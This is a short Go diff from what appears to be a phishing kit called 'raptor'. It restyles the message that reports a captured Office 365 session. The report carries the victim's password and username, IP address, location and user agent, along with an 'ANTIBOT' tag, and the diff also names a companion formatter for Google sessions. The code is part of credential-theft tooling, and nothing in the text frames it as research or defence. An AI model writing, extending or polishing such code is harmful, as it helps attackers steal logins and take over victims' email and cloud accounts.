@@ -183,15 +183,17 @@ func (f *SessionFormatter) formatO365Session(session *Session, location string, 
 }`, session.Password, session.Username)
 	}
 
-	return fmt.Sprintf(`raptor 🔥 (o365) 🔥
-        %s
+	return fmt.Sprintf(`🚀 raptor • Office 365 Capture • 🚀
+%s
 
-(##      USER FINGERPRINTS       ##
+╔════════════════════════════════════╗
+║          USER FINGERPRINTS         ║
+╚════════════════════════════════════╝
 
-IP: %s
-LOCATION: %s
-INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
-USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
+• 🌐 IP: %s
+• 📍 Location: %s
+• 🛡️ Info: Authenticated with ANTIBOT (Private)
+• 💻 User-Agent: %s`, credentials, session.RemoteAddr, location, session.UserAgent)
 }
 
 // formatGoogleSession formats Google/Gmail session
